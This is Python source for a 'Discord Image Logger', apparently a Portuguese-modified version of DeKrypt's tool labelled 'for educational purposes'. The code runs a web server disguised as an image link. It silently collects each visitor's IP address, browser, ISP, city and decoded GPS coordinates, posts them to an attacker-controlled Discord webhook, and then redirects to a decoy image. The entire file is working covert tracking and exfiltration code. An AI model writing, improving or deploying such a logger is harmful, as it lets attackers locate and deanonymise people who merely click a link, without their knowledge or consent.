# Discord Image Logger (Modificado)
# By DeKrypt | Modificado para fins educacionais

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Advanced IP Logger"
__description__ = "Educational tool for testing browser capabilities"
__version__ = "v2.1"
__author__ = "DeKrypt"

config = {
    # CONFIGURAÇÃO PRINCIPAL #
    "webhook": "SEU_WEBHOOK_AQUI",
    "image": "https://exemplo.com/imagem.jpg",
    "imageArgument": True,

    # PERSONALIZAÇÃO #
    "username": "Security Logger",
    "color": 0x7289DA,  # Cor do Discord

    # OPÇÕES #
    "accurateLocation": True,  # Ativado para GPS
    "crashBrowser": False,
    "vpnCheck": 1,
    "antiBot": 1,
}

blacklistedIPs = ("27", "104", "143", "164")

def get_location_info(ip: str) -> dict:
    """Coleta dados de localização via IP-API"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10)
        return response.json()
    except:
        return {"status": "fail"}

def send_webhook(embed: dict):
    """Envia dados para o webhook do Discord"""
    requests.post(config["webhook"], json={
        "username": config["username"],
        "embeds": [embed],
    })

class EnhancedLogger(BaseHTTPRequestHandler):
    def handle_request(self):
        try:
            # Coleta dados básicos
            ip = self.headers.get("X-Forwarded-For", "N/A")
            user_agent = self.headers.get("User-Agent", "N/A")

            # Verificação de bots/VPN
            if ip.startswith(blacklistedIPs):
                return

            # Coleta de localização precisa
            coords = None
            query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
            if config["accurateLocation"] and "g" in query:
                try:
                    coords = base64.b64decode(query["g"]).decode()
                except:
                    coords = "Erro na decodificação"

            # Coleta informações do IP
            ip_info = get_location_info(ip)
            if ip_info.get("status") != "success":
                ip_info = {}

            # Prepara embed do Discord
            embed = {
                "title": "🚨 Novo Acesso Detectado",
                "color": config["color"],
                "fields": [
                    {"name": "🌐 IP Público", "value": f"`{ip}`", "inline": True},
                    {"name": "📍 Coordenadas", "value": f"`{coords or 'N/A'}`", "inline": True},
                    {"name": "🏙️ Cidade", "value": ip_info.get("city", "N/A"), "inline": True},
                    {"name": "🖥️ Navegador", "value": httpagentparser.simple_detect(user_agent)[1], "inline": True},
                    {"name": "📡 Provedor", "value": ip_info.get("isp", "N/A"), "inline": True},
                ],
                "footer": {"text": f"User Agent: {user_agent}"}
            }

            send_webhook(embed)

            # Resposta ao cliente
            self.send_response(302)
            self.send_header("Location", config["image"])
            self.end_headers()

        except Exception as e:
            self.send_error(500, f"Erro interno: {str(e)}")
            traceback.print_exc()

    do_GET = handle_request
    do_POST = handle_request

if __name__ == "__main__":
    from http.server import HTTPServer
    server = HTTPServer(("0.0.0.0", 8080), EnhancedLogger)
    print("Servidor iniciado na porta 8080")
    server.serve_forever()
